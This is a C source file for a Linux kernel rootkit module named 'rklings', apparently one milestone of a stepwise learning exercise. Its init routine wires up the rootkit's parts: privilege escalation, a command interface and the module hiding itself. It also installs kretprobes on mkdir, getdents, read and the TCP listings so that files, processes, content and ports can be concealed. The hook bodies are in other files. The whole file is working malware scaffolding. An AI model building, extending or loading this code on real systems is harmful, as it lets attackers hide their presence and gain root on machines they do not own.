// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

static int cmd_ping(const char *arg)
{
	pr_info("rklings: pong\n");
	return 0;
}

static int cmd_status(const char *arg)
{
	pr_info("rklings: alive\n");
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	rk_target_init(&rk_file_targets);
	rk_target_init(&rk_pid_targets);
	rk_target_init(&rk_content_targets);
	rk_target_init(&rk_port_targets);

	ret = rk_cmd_register("ping", cmd_ping);
	if (ret)
		return ret;
	ret = rk_cmd_register("status", cmd_status);
	if (ret)
		return ret;

	ret = rk_escalate_init();
	if (ret)
		return ret;

	ret = rk_module_cmds_init();
	if (ret)
		return ret;

	ret = rk_filter_init();
	if (ret)
		return ret;

	ret = rk_proc_init();
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		goto fail_mkdir;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	ret = register_kretprobe(&rk_getdents_probe);
	if (ret)
		goto fail_getdents;

	ret = register_kretprobe(&rk_read_probe);
	if (ret)
		goto fail_read;

	ret = register_kretprobe(&rk_tcp4_probe);
	if (ret)
		goto fail_tcp4;

	ret = register_kretprobe(&rk_tcp6_probe);
	if (ret)
		goto fail_tcp6;

	return 0;

fail_tcp6:
	unregister_kretprobe(&rk_tcp4_probe);
fail_tcp4:
	unregister_kretprobe(&rk_read_probe);
fail_read:
	unregister_kretprobe(&rk_getdents_probe);
fail_getdents:
	unregister_kretprobe(&rk_mkdirat_probe);
fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
fail_mkdir:
	rk_proc_exit();
	return ret;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	unregister_kretprobe(&rk_tcp6_probe);
	unregister_kretprobe(&rk_tcp4_probe);
	unregister_kretprobe(&rk_read_probe);
	unregister_kretprobe(&rk_getdents_probe);
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
	rk_proc_exit();
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local control milestone");
